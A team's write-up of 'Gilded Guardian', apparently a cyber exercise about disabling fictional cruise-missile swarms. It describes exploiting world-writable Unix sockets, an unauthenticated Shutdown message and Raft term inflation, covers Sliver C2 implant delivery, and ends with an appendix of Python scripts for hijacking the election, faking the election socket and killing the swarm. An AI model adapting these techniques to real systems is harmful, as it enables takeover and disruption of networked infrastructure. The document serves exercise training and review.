---
tags:
lecture:
date:
related:
aliases:
created: 2026-03-30T12:10
modified: 2026-03-30T14:10
---

# Gilded Guardian

## March 28, 2026

---

## Summary

Gilded Guardian was a cybersecurity exercise hosted by Cyber Outcomes Group LLC in which our team was tasked with defending the fictional nation of Halcyon against incoming cruise missile swarms. The scenario placed us in the role of cyber operators for Joint Task Force Phoenix, with the mission of using non-kinetic (cyber) effects to disable in-flight Mantis cruise missile swarms before they could strike coastal defenses in AO Rizzo. We placed in the top 5 out of all competing teams.

Our approach centered on exploiting critical design vulnerabilities in the Mantis Swarm architecture to take over controller leadership and issue kill commands to every sensor and strike asset in each swarm. The path from “reading the docs” to “swarm kill confirmed” was not smooth: we fought Sliver configuration issues, SCP syntax errors, placeholder-filled scripts, and multi-node complications for the better part of our four-hour window. This writeup covers everything from the plan, the chaos, and how we eventually got it done.

---

## The Scenario

### Operational Context

The Warning Order (WARNORD) established the situation: a hostile Chimaera guided missile cruiser was assessed to be within 600 km of the M-355 ground line of communication, armed with seven Mantis cruise missile swarms. Each swarm consisted of a standard package of 5 controllers, 6 sensors, and 15 strike assets (called “boomers”) with a weapons engagement range of 500 km. The most likely course of action was an approach to 500 km for the swarms to engage targets within 30 minutes.

The Operations Order (OPORD) refined the mission: Task Force Phoenix would detect, disrupt, and defeat incoming Valinor cruise missile swarms to defend critical infrastructure and maintain control of AO Rizzo. The desired end state was neutralization or diversion of all incoming missile swarms prior to target impact.

Critically, Cyber National Mission Forces had previously implanted Mantis missiles manufactured at the Eglarest plant with a beacon that would call back to our attack station when the missiles came within 450 km of Halcyon. This beacon was our way in.

### Rules of Engagement

All cyber effects had to be executed through the designated attack station. We had free fires against all Mantis Swarms but were limited to a maximum of three failed complete interceptions before AO Rizzo’s assets would be too degraded to repel Valinor’s aggression. The execution window was four hours.

### The Concept of Operations

The OPORD laid out four phases: (1) identify potential vulnerabilities and effects by analyzing design documentation, (2) prepare defensive infrastructure including a Sliver implant and listener, (3) conduct swarm reconnaissance, targeting, and effects, and (4) apply defensive effects and assess outcomes.

---

## Understanding the Target: Mantis Swarm Architecture

Before our watch window opened, we studied the intelligence materials extracted from the Eglarest facility.

### The Three Node Types

The Mantis Swarm is a distributed cruise missile platform with three node types, each running NixOS on ARM64 hardware.

**Controllers** (5 per swarm) are the brains of the operation. Each controller runs three daemons: `comms` (the message bus and network edge), `election` (a Raft-like leader election state machine), and `control` (the mission logic that tasks boomers against detected tracks). Only the elected leader’s `control` daemon is active. The `control` daemon on followers stay passive. Controllers communicate with each other over HTTP and with their local daemons over Unix domain sockets. The leader maintains a Certificate of Authority (COA) built from peer endorsements, which other daemons query via the election socket to verify leadership.

**Sensors** (6 per swarm) run two daemons: `hw` (hardware daemon for position and track detection) and `comms` (handles controller-facing communications). Sensors poll the leader controller every second with their location and every five seconds with a full dump of all detected tracks from their shared SQLite database. They’re essentially the swarm’s eyes. They work on detecting targets and feeding coordinates back to the leader.

**Boomers** (15 per swarm) also run two daemons with the same `hw`/`comms` split. Boomers poll the leader every second for task assignments. When the leader’s `control` daemon identifies a valid target (not friendly, within the mission box, not already assigned), it picks the closest available boomer and queues a `Boomer:Engage Request`. The boomer picks this up on its next poll, queries the designated sensor for live track coordinates, and begins a pursuit loop. It is repeatedly getting updated target coordinates and flying toward them until it’s within 50 meters, at which point the `comms` daemon exits (representing a successful intercept).

### The Message Protocol

All inter-node communication uses a common JSON Transmission envelope with fields for destination UUID, source UUID, a `msg` payload (JSON string, base64-encoded for election traffic), `msg_type` discriminator, optional signature material, and an authority object carrying COA endorsements. The protocol defines several message subtypes across election, sensor, boomer, and administrative domains.

The Transmission envelope looks like this:

```json
{
  "destination": "uuid",
  "source": "uuid",
  "msg": "string payload",
  "msg_type": "string",
  "msg_sig": "optional signature",
  "nonce": "optional nonce",
  "authority": { "endorsements": [] }
}
```

The Shutdown message type is particularly notable: it carries an empty payload `{}` and causes immediate process termination (`os.Exit(0)`) on any receiving node’s `comms` daemon with no graceful handshake. This would become our primary kill mechanism.

---

## Vulnerabilities Identified

Our analysis of the design documentation revealed several critical vulnerabilities that collectively formed our attack chain.

### World-Writable Unix Sockets

The `comms` daemon binds its Unix socket at `/run/commsDaemon/comms.sock` with permissions `0777`, meaning any local process can connect and inject arbitrary transmissions. The `election` socket at `/run/electionDaemon/election.sock` has the same permissive access. Here’s what we saw on-target:

```bash
drwxrwxrwx  /run/commsDaemon/
srwxrwxrwx  /run/commsDaemon/comms.sock
drwxrwxrwx  /run/electionDaemon/
srwxrwxrwx  /run/electionDaemon/election.sock
drwxrwxrwx  /run/hwDaemon/
srwxrwxrwx  /run/hwDaemon/hw.sock
```

This meant that once we had code execution on a controller, we could impersonate any daemon and inject any message type into the swarm’s communication fabric, even as the unprivileged `fetcher` user.

### Disabled Signature Verification

The controller configuration we encountered had `verify_signatures: false`, meaning inbound messages were accepted without cryptographic verification:

```yaml
verify_signatures: false
allow_broadcast: true
```

Even if signatures had been enabled, messages sent through the local `comms` socket are automatically signed by the `comms` daemon before outbound delivery, so our injected traffic would have been signed with the node’s own key regardless.

### Unauthenticated Shutdown

The `Shutdown` message type causes immediate `os.Exit(0)` on the receiving node’s `comms` daemon. There is no authentication check, no handshake, no confirmation. The comms daemon simply exits. Combined with the world-writable socket and disabled signatures, this meant we could kill any node in the swarm by queuing a Shutdown transmission addressed to its UUID through the leader’s `comms` socket.

### In-Memory-Only State

All worker locations, track assignments, election state, and outbound message queues exist only in memory. Nothing persists across restarts. Once a node’s `comms` daemon exits, all its state is gone.

### Exploitable Election Protocol

The election subsystem follows Raft semantics where a higher term number forces peers to step down and grant votes. By injecting `Election:Vote Request` messages with an artificially high term through the `comms` socket, we could force a leadership takeover. We also found that the readable Ed25519 private key at `/etc/controller/key.pem` could be harvested for additional operations if needed.

---

## The Attack Plan

Based on our vulnerability analysis, we developed a multi-phase attack plan organized around three team roles.

### Team Roles

|Role|Callsign|Responsibility|
|---|---|---|
|Operator 1|RECON|Gather config data, identify UUIDs, socket paths, peer IPs. Feed data to PAYLOAD.|
|Operator 2|PAYLOAD|Pre-stage Python scripts on the attack station. Adapt scripts with live data from RECON.|
|Operator 3|EXECUTE|Run scripts on target nodes via Sliver. Monitor results, troubleshoot failures.|

### The Kill Chain

Our primary kill chain was:

1. **Catch the callback** — The trojanized fetcher service on each Mantis node would pull our Sliver implant (`golden.exe`) from the attack station’s HTTP listener and execute it, giving us a remote session.
2. **Validate the target** — Confirm we’ve landed on a controller node (not a sensor or boomer) by checking for the presence of all four daemon directories.
3. **Extract configuration** — Dump the controller’s YAML config to get every UUID in the swarm (peer controllers, sensors, boomers), socket paths, and leadership state.
4. **Check leadership** — Query the election socket. If we’re already the leader, skip to step 6.
5. **Win the election** — If we’re a follower, inject high-term vote requests through the comms socket to force a Raft leadership takeover. Collect endorsements to build a valid COA.
6. **Kill the swarm** — Queue `Shutdown` transmissions addressed to every sensor and boomer UUID. Workers pick up the kill on their next poll cycle (1-2 seconds) and die immediately.

We developed five Python scripts to execute this chain: `check_leader.py`, `sniff_comms.py`, `win_election.py`, `replace_election_socket.py`, and `kill_swarm.py`. A sixth contingency script, `takeover_and_kill.py`, combined the election socket replacement and kill logic into a single all-in-one payload for cases where we couldn’t background separate processes through Sliver.

---

## Execution: What Actually Happened

### Phase 0 — Setting Up the Attack Station

We SSH’d into the attack station at `10.96.25.91` as `operator1`. On my system, the first obstacle was a “Too many authentication failures” error — the SSH client was trying all loaded public keys before attempting password auth:

```bash
❯ ssh operator1@sliver-69c7ea82bb324af474135496.vpn.cog
Received disconnect from 100.84.8.29 port 22:2: Too many authentication failures

# The fix:
❯ ssh -o PreferredAuthentications=password -o PubkeyAuthentication=no \
    operator1@sliver-69c7ea82bb324af474135496.vpn.cog
```

This would bite us repeatedly throughout the exercise because it’s easy to forget. I believe this was due to my 1password SSH authentication manager. I’ll be sure to reconfigure this before the final competition.

The Sliver C2 server was already running as a daemon. We connected via `sliver-client` and began setting up our infrastructure. This is where things got messy.

### The Listener

We generated a Sliver HTTP implant saved to `/var/www/golden.exe` with symbol obfuscation disabled for speed. However, getting the listener and file server configuration right consumed a painful amount of time.

The architecture required two separate services running simultaneously: a **file server** on port `34652` for the Mantis fetcher services to download `golden.exe` from (the fetchers were hardcoded to pull from `http://10.96.25.91:34652/golden.exe`), and a **Sliver C2 listener** on a different port for the implant to call back to once executed on-target. A pre-existing Python file server was already running on port 34652 to serve the binary. This was critical infrastructure, not something to replace.

The problem was that we accidentally killed the Python file server on 34652 while trying to set up Sliver, breaking the delivery pipeline. We then spent significant time untangling the two services: restarting the file server, getting Sliver’s listener bound to a separate port (`8443`), and regenerating the implant so it would call back to the correct Sliver listener port rather than the file server port. The implant had to be compiled with the same callback port that the Sliver listener was running on. If we get that wrong the callbacks silently go nowhere.

On top of that, we discovered Sliver was generating **HTTPS** implants while we were running **HTTP** listeners. Another mismatch that caused silent failures. We fixed this by switching to `https` listeners.

**For the future:** Understand which ports serve which purpose before touching anything. The file server (delivery) and the C2 listener (callback) are separate services and must not conflict. Verify that the implant’s compiled callback protocol and port match the listener exactly. Have your C2 infrastructure fully tested before the watch window opens.

### Early Reconnaissance

While sorting out the listener issues, we ran ping sweeps and port scans across the `10.96.24.0/22` target network. We found three live hosts: `10.96.27.209` (port 10000 open, consistent with a controller’s `comms` HTTP server), `10.96.27.248`, and `10.96.27.250` (no standard ports open).

### The First Quick Kill

Before we even had an implant callback, we tried a direct approach: sending a Shutdown transmission via HTTP POST to the controller we’d found at `10.96.27.209:10000`. It worked! The comms daemon exited, and the port went dead. One controller down with a single HTTP request.

However, this only killed one controller, not the entire swarm. The remaining nodes would simply elect a new leader and continue their mission. We needed implant access to execute the full kill chain.

### First Implant Callback: The Controller Node

On our second attempt with a properly configured Sliver listener and `golden.exe` port, the fetcher service on a target node pulled `golden.exe` and called back. We got a Sliver session (codenamed `WHITE_CLAIM`) running as the `fetcher` user on a NixOS ARM64 box.

We confirmed it was a controller by checking for the four systemd services. The process listing told us everything we needed:

```bash
sliver (WHITE_CLAIM) > ps

921 1 comms
922 1 control
923 1 election
924 1 auto-puller
925 1 hw
```

All four daemons present — `comms`, `control`, `election`, and `hw` — plus the `auto-puller` (fetcher) that delivered our implant. The runtime socket directories at `/run/commsDaemon/`, `/run/electionDaemon/`, and `/run/hwDaemon/` were all world-writable (`drwxrwxrwx` permissions, socket files at `0777`).

The configuration at `/etc/controller/config.yaml` confirmed `verify_signatures: false` and `allow_broadcast: true`. The `hwDaemon` had `ARMED=true` in its environment.

### The SCP Syntax Issues

Getting our Python scripts onto the target turned into its own headache. Our initial approach was to SCP files from our local machines to the attack station and then upload to the target via Sliver. But SCP kept failing with “Too many authentication failures” and “No such file or directory” errors, similar to the SSH connection attempts.

We fixed the problem the same way with SSH: using `-o` flags before the source/destination arguments:

```bash
❯ scp -o PreferredAuthentications=password -o PubkeyAuthentication=no \
    ~/Downloads/check_leader.py operator1@sliver-...:/tmp/payloads/
check_leader.py       100%  845    13.0KB/s   00:00
```

We got the files to the attack station eventually, but not before wasting precious time. We also discovered that using Sliver’s built-in `upload` command was more reliable than SCP for getting files onto the target itself:

```bash
sliver (WHITE_CLAIM) > upload /home/operator/check_leader.py /tmp/check_leader.py
sliver (WHITE_CLAIM) > upload /home/operator/kill_swarm.py /tmp/kill_swarm.py
```

### Sliver Quirks and Workarounds

Sliver’s `execute` command introduced its own set of challenges that we had to learn on the fly:

```bash
# WRONG — pipes don’t work without a shell
sliver > execute /run/current-system/sw/bin/ls /run/commsDaemon | grep sock

# RIGHT — wrap in bash -c
sliver > execute /run/current-system/sw/bin/bash -- -c "ls /run/commsDaemon | grep sock"

# WRONG — Sliver eats the -la flag
sliver > execute /run/current-system/sw/bin/ls -la /run/commsDaemon

# RIGHT — use -- to separate Sliver flags from command flags
sliver > execute /run/current-system/sw/bin/ls -- -la /run/commsDaemon

# Running Python scripts required the full NixOS binary path
sliver > execute /run/current-system/sw/bin/python3 /tmp/check_leader.py
```

These quirks cost us time on nearly every operation as we debugged unexpected failures.

### The Placeholder Problem

Our five Python scripts were written with placeholder values (`__OUR_UUID__`, `__COMMS_SOCKET_PATH__`, `__ELECTION_SOCKET_PATH__`, `__PEER_LIST__`, `__SENSOR_LIST__`, `__BOOMER_LIST__`) that needed to be filled with live data from the target’s configuration. On the attack station, we used `sed` to replace the simple placeholders:

```bash
sed -i 's/__OUR_UUID__/2959a16e-2a6b-d154-547a-10a7810e9ce0/g' payloads/*.py
sed -i 's|__COMMS_SOCKET_PATH__|/run/commsDaemon/comms.sock|g' payloads/*.py
sed -i 's|__ELECTION_SOCKET_PATH__|/run/electionDaemon/election.sock|g' payloads/*.py
```

But the list-type placeholders (`__PEER_LIST__`, `__SENSOR_LIST__`, `__BOOMER_LIST__`) required formatting the UUIDs from the config as Python list elements, which was more involved. We ended up building a local Python patch script to extract all the UUIDs from the dumped config and inject them into both `win_election.py` and `kill_swarm.py`.

**For the future:** Have a working payload templating system before the exercise. Have a script that takes a YAML config as input and outputs fully populated attack scripts. Manual sed replacements under time pressure are error-prone.

### First Node: Already the Leader

When we ran `check_leader.py` on the first controller node (UUID `2959a16e-2a6b-d154-547a-10a7810e9ce0`, IFF 2023), we got a pleasant surprise:

```bash
sliver (WHITE_CLAIM) > execute /run/current-system/sw/bin/python3 /tmp/check_leader.py

LEADER: YES (5 endorsements)
  endorser=<peer1-uuid>  expires=...
  endorser=<peer2-uuid>  expires=...
  endorser=<peer3-uuid>  expires=...
  endorser=<peer4-uuid>  expires=...
  endorser=<peer5-uuid>  expires=...
```

Already the elected leader with 5 out of 5 endorsements at term 3, with endorsements rotating approximately every 60 seconds.

We ran `sniff_comms.py` to confirm the swarm was alive and active. The output showed all 15 boomers and 6 sensors actively polling this node:

```bash
sliver (WHITE_CLAIM) > execute /run/current-system/sw/bin/python3 /tmp/sniff_comms.py

Listening on comms socket for 15 seconds...

[Boomer:Get Tasks] src=<boomer-uuid> dst=2959a16e-...
[Boomer:Get Tasks] src=<boomer-uuid> dst=2959a16e-...
[Sensor:Get Tasks] src=<sensor-uuid> dst=2959a16e-...
[Sensor:Track Update] src=<sensor-uuid> dst=2959a16e-...
[Election:Endorsement Response] src=<peer-uuid> dst=2959a16e-...
...
```

The swarm was fully operational and looking for targets.

This meant we could skip the entire election takeover phase and go straight to the kill. We just needed our `kill_swarm.py` script properly populated with all 21 worker UUIDs.

### The Swarm Kills

The kill process was relatively straightforward once the scripts were properly configured. The core of `kill_swarm.py` queues a Shutdown transmission for each worker UUID through the comms socket:

```python
# Connect to comms socket
comms = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
comms.connect(COMMS_SOCK)

# Queue Shutdown for each worker
for worker_uuid in ALL_WORKERS:
    msg = {
        "source": OUR_UUID,
        "destination": worker_uuid,
        "msg": "{}",
        "msg_type": "Shutdown",
        "authority": coa,
    }
    comms.sendall((json.dumps(msg) + "\n").encode())
```

The expected output looked like:

```shell
sliver (WHITE_CLAIM) > execute /run/current-system/sw/bin/python3 /tmp/kill_swarm.py

[+] Leader confirmed (5 endorsements)
[*] Connecting to comms socket...
[*] Sending Shutdown to 21 workers...
  -> Shutdown queued for 8a3b1c2d...
  -> Shutdown queued for 9f4e2d1a...
  ...
[+] Shutdown queued for 21 workers
    Sensors: 6
    Boomers: 15
[*] Workers will die on their next poll cycle (~1-2 seconds)
[+] SWARM KILL COMPLETE
```

Workers would pick up the Shutdown on their next poll cycle within 1-2 seconds and their `comms` daemons would immediately exit. We verified kills by re-running `sniff_comms.py` and confirming the absence of worker polling traffic.

**For the future:** Design the tooling to be parameterized from the start. A single script that reads the local config file and does everything, including checking leadership, extracting UUIDs, and sending kills, would have saved enormous time across multiple swarms.

---

## What Worked

**Pre-exercise documentation analysis** was the single biggest contributor. By the time our watch window opened, we already knew the architecture, the vulnerabilities, the message protocol, and the kill chain. We had scripts written and a playbook ready.

**The Shutdown message type** was devastatingly effective. No authentication, no handshake, immediate process termination. Once we had leader access, killing a 26-node swarm took seconds.

**The world-writable sockets** made everything possible. Without them, we would have needed to either compromise the daemon processes directly or find a privilege escalation path. Instead, any local user could inject arbitrary traffic into the swarm’s control plane. This will likely not be the case for the final competition.

**Using AI agents for parallel script development** while the human operators focused on infrastructure and recon was an effective use of our team’s bandwidth. The coding agent produced working scripts that we could adapt with live data.

**The Raft election takeover** worked exactly as theorized. Injecting a high term number forced peers to step down, and the comms socket’s automatic signing meant our injected election traffic was properly authenticated to the rest of the cluster.

---

## What Didn’t Work (or Took Too Long)

**Sliver C2 infrastructure setup** consumed far too much of our window. The HTTP/HTTPS mismatch, port conflicts with existing services, and listener configuration issues should have been caught in pre-exercise testing. We effectively lost the first hour to infrastructure problems.

**SCP and SSH authentication issues** were a recurring time sink. The `-o` flag ordering requirement caught us off guard every time we opened a new terminal. These configuration issues should be addressed before the competition even starts.

**Manual placeholder replacement in scripts** was the biggest operational bottleneck during execution. Copying UUIDs by hand, formatting them as Python lists, running sed commands through Sliver, all of it was slow and error-prone. A single autoconfiguring script that read the local config would have been better.

**The multi-swarm adaptation problem** meant we were essentially repeating our entire payload preparation process for each new swarm. With seven swarms total in the scenario, this serialized workflow was not scalable within the time window.

**The initial `shutdown_swarm.py` script** (the HTTP POST version built early on) had bugs: it was missing the `destination` field required by the comms socket driver’s validation and wasn’t iterating over individual worker UUIDs. The Unit-Test-Script.py provided in the exercise materials also had issues. It sent a single Shutdown with a hardcoded dummy UUID and no destination, which wouldn’t reach any specific worker:

```python
# From Unit-Test-Script.py — note the missing destination field
# and dummy source UUID
msgBody = {
    "source": "123e4567-e89b-12d3-a456-426614174001",
    "msg": "",
    "msg_type": "Shutdown"
}
msgBody[‘authority’] = coa
client_socket.sendall(json.dumps(msgBody).encode(‘utf-8’))
```

Our corrected version iterated over every worker UUID and included both `source` and `destination` fields.

---

## Key Technical Insights

**The comms Unix socket is the single most important attack surface.** It accepts arbitrary transmissions from any local process, validates only that source and destination are non-nil, and signs everything automatically before delivery. If you can write to this socket, you own the swarm.

**Election protocol follows Raft semantics where a higher term forces peers to step down.** Term inflation is a reliable takeover vector. The implementation doesn’t appear to have guards against unreasonably high term numbers.

**Workers use sequential failover across configured controllers.** Disrupting the current leader naturally drives worker traffic to the next controller in their list within seconds. This means you can position yourself as the failover target.

**There’s no Shutdown handler for peer controllers.** Killing other controllers requires either direct shell access or indirect disruption (DoS, election manipulation). The Shutdown message only terminates sensor and boomer comms daemons.

**All state is in-memory.** No persistence across restarts for worker locations, track assignments, or outbound message queues. A restarted node comes back with a blank slate.

**The `comms` daemon signs outbound messages automatically.** Even with `verify_signatures: true`, messages injected through the local socket will be properly signed with the node’s own key. This makes the local socket injection transparent to signature verification on the receiving end.

**Election payloads are base64url-encoded JSON, while worker payloads are plain JSON.** This encoding difference tripped us up initially. Our Shutdown payloads were sent in both formats as a hedge. In practice, the Shutdown handler doesn’t appear to parse the payload at all (it’s an empty object), so encoding may not matter for that specific message type.

---

## Lessons Learned and Recommendations for Next Time

### Before the Exercise

1. **Have C2 infrastructure fully tested and documented:** Listener types, ports, implant configuration, file server setup. Create a checklist and verify everything works end-to-end before the watch window opens.
2. **Build auto-configuring payloads:** Write a single Python script that reads the local node’s config file, extracts all UUIDs and socket paths, determines leadership status, and executes the full kill chain autonomously. No placeholders, no manual sed.
3. **Create shell aliases for SSH/SCP or fix configuration:** Something like `alias sscp='scp -o PreferredAuthentications=password -o PubkeyAuthentication=no'` to eliminate recurring authentication issues.
4. **Practice Sliver operations:** Know the `execute` quirks, the `upload` workflow, and how to handle session recovery. Build muscle memory.
5. **Prepare per-swarm automation:** Since each swarm has different UUIDs, have a workflow that can be rapidly re-targeted. Ideally, the implant itself should auto-configure and phone home with extracted config data.

### During the Exercise

6. **Prioritize getting one clean kill** before trying to optimize. Prove the attack chain works on one swarm, then streamline for the rest.
7. **Assign clear roles and stick to them.** The three-operator model (RECON, PAYLOAD, EXECUTE) worked well conceptually but broke down when everyone was troubleshooting the same infrastructure problem.
8. **Keep a running log of every command and its output.** We lost track of what had been tried and what had worked during the chaos of the exercise.

### After the Exercise

9. **What to expect for finals.** We were able to debrief with the event admin to ask some questions after we finished. During this conversation, he explained that the final would be very similar to this event. It’s very likely it will be the same exercise, but we’ll need to get through all 7 scenarios. Expect to drop in to Sensor and Boomer nodes in later scenarios.

## Tools Used

| Tool                  | Purpose                                                                                                   |
| --------------------- | --------------------------------------------------------------------------------------------------------- |
| Sliver C2             | Command and control framework for implant generation, listener management, and remote session interaction |
| Python 3              | All attack scripts (election manipulation, comms sniffing, swarm kill)                                    |
| SCP/SSH               | File transfer to attack station                                                                           |
| nmap (via ping sweep) | Network reconnaissance across the /22 target range                                                        |
| curl                  | Direct HTTP POST for initial controller kill                                                              |
| sed                   | Script placeholder replacement on the attack station                                                      |
| AI coding agents      | Parallel script development and architecture analysis                                                     |

---

## Appendix: Attack Scripts

### `check_leader.py`

Queries the election socket and reports whether the current node is the elected leader, including endorsement count and details.

```python
ELECTION_SOCK = "/run/electionDaemon/election.sock"

s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect(ELECTION_SOCK)
raw = s.recv(409600).decode()
s.close()
coa = json.loads(raw)
endorsements = coa.get("endorsements", [])
if len(endorsements) > 0:
    print(f"LEADER: YES ({len(endorsements)} endorsements)")
    for e in endorsements:
        print(f"  endorser={e.get('endorser', '?')}"
              f"  expires={e.get('expiration', '?')}")
else:
    print("LEADER: NO")
```

### `sniff_comms.py`

Connects to the comms socket and passively observes all inbound traffic for 15 seconds. Decodes election traffic payloads and identifies active workers by their polling messages. Used for both pre-attack reconnaissance and post-kill verification.

```python
s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect(COMMS_SOCK)
s.settimeout(2.0)

deadline = time.time() + 15
while time.time() < deadline:
    try:
        chunk = s.recv(65536)
        # Parse JSON messages from the stream
        msg = json.loads(chunk.decode())
        mt = msg.get("msg_type", "")
        src = msg.get("source", "?")
        print(f"[{mt}] src={src} dst={msg.get('destination', '?')}")
        if mt.startswith("Election:"):
            # Decode base64url election payload
            payload = json.loads(base64.b64decode(msg["msg"]).decode())
            print(f"  payload: {json.dumps(payload)}")
    except socket.timeout:
        continue
```

### `win_election.py`

The election takeover script. Connects to the comms socket, injects `Election:Vote Request` messages with term 99999 to all peer controllers, collects vote responses until quorum, then requests and collects endorsements. Saves the captured COA to `/tmp/captured_coa.json` and checks whether the real election daemon has updated.

```python
TOTAL_CONTROLLERS = len(PEER_CONTROLLERS) + 1  # +1 for us
QUORUM = (TOTAL_CONTROLLERS // 2) + 1

# Step 1: Send vote requests with inflated term
vote_payload = {"leader": OUR_UUID, "term": 99999}
for peer in PEER_CONTROLLERS:
    send_msg(comms, peer["uuid"], "Election:Vote Request", vote_payload)

# Step 2: Collect votes until quorum
# (listens on comms socket for Election:Vote Response messages)
# votes_received + 1 (self-vote) >= QUORUM → success

# Step 3: Request endorsements from all peers
endorse_payload = {"term": 99999}
for peer in PEER_CONTROLLERS:
    send_msg(comms, peer["uuid"], "Election:Endorsement Request", endorse_payload)

# Step 4: Save captured COA
coa = {"endorsements": endorsements_received}
with open("/tmp/captured_coa.json", "w") as f:
    json.dump(coa, f, indent=2)
```

### `replace_election_socket.py`

Fallback script for when the real election daemon doesn’t reflect our stolen leadership. Removes the existing election socket file, binds a new one at the same path, and serves our captured COA to any daemon that queries it.

```python
# Load COA captured during election takeover
with open("/tmp/captured_coa.json") as f:
    coa = json.load(f)

# Replace the real election socket
os.unlink(ELECTION_SOCK)
server = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
server.bind(ELECTION_SOCK)
os.chmod(ELECTION_SOCK, 0o777)
server.listen(10)

# Serve captured COA to comms and control daemons
coa_bytes = json.dumps(coa).encode()
while True:
    conn, _ = server.accept()
    conn.sendall(coa_bytes)
    conn.close()
```

### `kill_swarm.py`

Confirms leadership via the election socket, then connects to the comms socket and queues Shutdown transmissions for every sensor and boomer UUID in the swarm. Sends both base64-encoded and plain JSON payload variants as a hedge against encoding ambiguity.

```python
# Confirm leadership first
es = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
es.connect(ELECTION_SOCK)
coa = json.loads(es.recv(409600).decode())
es.close()
if len(coa.get("endorsements", [])) == 0:
    print("[!] NOT LEADER. Cannot send Shutdown.")
    sys.exit(1)

# Connect to comms and send Shutdown to every worker
comms = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
comms.connect(COMMS_SOCK)

ALL_WORKERS = SENSOR_UUIDS + BOOMER_UUIDS  # 6 + 15 = 21
for worker_uuid in ALL_WORKERS:
    msg = {
        "source": OUR_UUID,
        "destination": worker_uuid,
        "msg": "{}",
        "msg_type": "Shutdown",
        "authority": coa,
    }
    comms.sendall((json.dumps(msg) + "\n").encode())
```

### `takeover_and_kill.py`

Combined contingency script that runs a fake election socket server in a background thread while simultaneously sending Shutdown to all workers. This was for cases where we need socket replacement and can’t background separate processes through Sliver.

```python
def serve_election_socket():
    """Background thread: serve COA on election socket."""
    os.unlink(ELECTION_SOCK)
    srv = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    srv.bind(ELECTION_SOCK)
    os.chmod(ELECTION_SOCK, 0o777)
    srv.listen(10)
    coa_bytes = json.dumps(coa).encode()
    while True:
        conn, _ = srv.accept()
        conn.sendall(coa_bytes)
        conn.close()

# Start election socket server in background
t = threading.Thread(target=serve_election_socket, daemon=True)
t.start()
time.sleep(1)

# Send Shutdown to all workers
comms = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
comms.connect(COMMS_SOCK)
for wid in ALL_WORKERS:
    msg = {"source": OUR_UUID, "destination": wid,
           "msg": "{}", "msg_type": "Shutdown", "authority": coa}
    comms.sendall((json.dumps(msg) + "\n").encode())

# Keep serving COA for 30s so comms can validate on worker polls
time.sleep(30)
```
